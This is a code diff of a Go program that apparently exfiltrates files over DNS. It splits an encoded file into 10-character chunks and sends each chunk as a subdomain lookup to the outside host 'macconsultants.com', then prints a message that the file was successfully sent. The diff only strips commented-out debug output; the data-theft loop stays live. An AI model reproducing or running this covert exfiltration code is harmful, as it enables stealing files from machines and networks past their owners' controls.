@@ -45,32 +45,23 @@ func main() {
             initializer += 1
             dom := sendme + ".macconsultants.com"
             r.LookupHost(context.Background(),dom)
-            //ipaddy, _ := r.LookupHost(context.Background(),dom)
-            //fmt.Println(ipaddy[0])
-            //fmt.Println(sendme)//append sendme as: sendmefinal.domain.com and send to the server
+          
           } else {
             int3 := 10*initializer
             int4 := 10 + int3
 
             if (length < 10){
-              //int5 := int3 + length
               sendmefinal := encoded[int3:(int4-(length+1))]
               mydom := sendmefinal + ".macconsultants.com"
               r.LookupHost(context.Background(),mydom)
-              //ipaddy2, _ := r.LookupHost(context.Background(),mydom)
               fmt.Println("[+] File " + file + " successfully sent!")
-              //fmt.Println(ipaddy2[0])
-              //fmt.Println(sendmefinal)//append sendmefinal as: sendmefinal.domain.com and send to the server
               break
             }
             sendme2 := encoded[int3:int4]
             dom2 := sendme2 + ".macconsultants.com"
             r.LookupHost(context.Background(),dom2)
-            //ipaddy3, _ := r.LookupHost(context.Background(),dom2)
-            //fmt.Println(ipaddy3[0])
             length -= 10
             initializer += 1
-            //fmt.Println(sendme2)//append sendme2 as: sendmefinal.domain.com and send to the server
           }
 
 
@@ -87,12 +78,5 @@ func main() {
     }
 
   }
-
-  // ip, _ := r.LookupHost(context.Background(),"testing.com")
-  // ip2, _ := r.LookupHost(context.Background(),"testing1.com")
-  // print(ip[0])
-  // print("\n")
-  // print(ip2[0])
-  // print("\n")
 
 }
